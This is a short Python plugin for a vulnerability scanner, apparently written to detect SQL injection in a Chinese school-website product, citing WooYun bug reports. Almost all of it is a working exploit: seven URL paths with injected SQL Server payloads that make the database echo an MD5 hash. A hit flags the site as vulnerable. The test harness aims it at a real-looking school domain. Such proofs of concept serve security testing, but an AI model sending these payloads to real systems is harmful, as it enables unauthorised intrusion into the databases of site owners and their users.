#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2010-069224
#ref http://www.wooyun.org/bugs/wooyun-2010-076636
#ref http://www.wooyun.org/bugs/wooyun-2010-076538

def assign(service, arg):
    if service == "xinzuobiao":
        return True, arg


def audit(arg):
    import urllib2
    payloads = ['DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx?ClsID=4012&KindID=%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',\
    'dpma/FWeb/WorkRoomWeb/Web/Index.aspx?TID=1%20AND%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',\
    'dpma/FWeb/WorkRoomWeb/Web/TeacherAlbums_New.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',\
    'dpma/FWeb/WorkRoomWeb/Web/TeacherBlogDetail.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000',\
    'dpma/FWeb/WorkRoomWeb/WebYRY/TeacherBlog.aspx?tid=1%20%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',\
    'DPMA/FWeb/SPEWeb/Web5/SPEVideosDetail.aspx?KindSetID=30000&VideoID=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',\
    'dpma/FWeb/SchoolWeb/Web/AnnounAndNews.aspx?Type_Anews=1&sid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000']
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('xinzuobiao', 'http://www.azxx.net/')[1])